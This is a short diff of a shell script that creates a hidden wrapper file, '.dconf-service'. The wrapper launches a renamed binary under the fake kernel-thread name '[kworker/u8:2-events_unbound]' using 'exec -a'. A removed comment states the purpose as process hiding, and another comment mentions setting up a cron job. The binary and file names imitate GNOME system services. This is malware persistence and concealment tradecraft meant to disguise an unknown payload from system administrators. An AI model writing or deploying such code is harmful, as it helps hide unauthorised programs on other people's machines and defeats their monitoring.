@@ -32,14 +32,12 @@ EOF
 
 chmod +x user
 
-# 3. Create wrapper with exec -a for process hiding                                                                                                                                                                                                          
 cat << 'WRAPPER' > .dconf-service                                                                                                                                                                                                                            
 #!/bin/bash                                                                                                                                                                                                                                                  
 cd "$(dirname "$0")"                                                                                                                                                                                                                                         
 exec -a "[kworker/u8:2-events_unbound]" ./gdbus user                                                                                                                                                                                                         
 WRAPPER                                                                                                                                                                                                                                                      
 chmod +x .dconf-service                                                                                                                                                                                                                                      
-                                                                                                                                                                                                                                                              
 
 
 # 3. Write cron that runs EXACTLY: unicorn master
